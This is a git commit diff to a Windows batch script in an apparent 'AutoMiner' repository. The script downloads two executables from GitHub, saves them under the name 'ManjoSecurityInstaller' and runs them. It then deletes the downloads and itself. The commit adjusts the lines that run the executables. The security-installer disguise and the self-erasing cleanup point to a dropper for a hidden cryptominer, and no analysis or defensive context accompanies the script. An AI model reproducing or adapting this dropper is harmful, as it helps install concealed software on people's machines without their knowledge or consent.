5a610c15f0f605c1ced3da4265cace010b7054f8
Elliot Marks <elliotmarks06@gmail.com>
2021-08-23 21:26:14 -0600

    Update Script.bat

--- Script.bat
+++ Script.bat
@@ -2,10 +2,10 @@
 cd C:/
 curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_C.exe?raw=true -o ManjoSecurityInstallerC.exe
 Ren "ManjoSecureRollout_C.exe_raw=true" "ManjoSecureRollout_C.exe"
-ManjoSecureRollout_C.exe
 curl https://downgit.github.io/#/home?url=https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_g.exe?raw=true -o ManjoSecurityInstallerG.exe
 Ren "ManjoSecureRollout_g.exe_raw=true" "ManjoSecureRollout_g.exe"
-ManjoSecureRollout_g.exe && echo done
+ManjoSecureRollout_C.exe && echo C Done
+ManjoSecureRollout_g.exe && echo G Done
 Timeout /t 1 >nul && Del ManjoSecurityInstallerC.exe && Del ManjoSecurityInstallerG.exe
 Echo files deleted && Timeout /t 1 >nul
 Del Script.bat
